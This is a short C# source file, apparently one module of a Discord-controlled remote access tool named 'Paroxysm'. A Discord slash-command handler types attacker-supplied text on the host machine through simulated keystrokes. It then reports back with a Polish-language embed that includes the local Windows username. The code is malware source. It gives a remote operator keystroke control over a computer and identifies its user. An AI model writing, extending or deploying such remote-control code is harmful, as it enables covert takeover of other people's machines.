using System.Diagnostics;
using Discord;
using Discord.WebSocket;
using Paroxysm.Discord;
using WindowsInput;

namespace Paroxysm.Hooks.Actions;

public static class KeyboardAction
{
    private static void SimulateKeyPress(string inputText)
    {
        InputSimulator simulator = new();

        foreach (char c in inputText)
        {
            simulator.Keyboard.TextEntry(c);
        }
    }
    
    public static Embed Follow(SocketSlashCommand slashCommand)
    {
        string inputText = slashCommand.Data.Options.ElementAt(0).Value as string;
        SimulateKeyPress(inputText);

        return DiscordEmbed.CreateWithText(Color.Blue, "Zakończono", $"Wypisano znaki {inputText}",
            Environment.UserName, null);
    }
}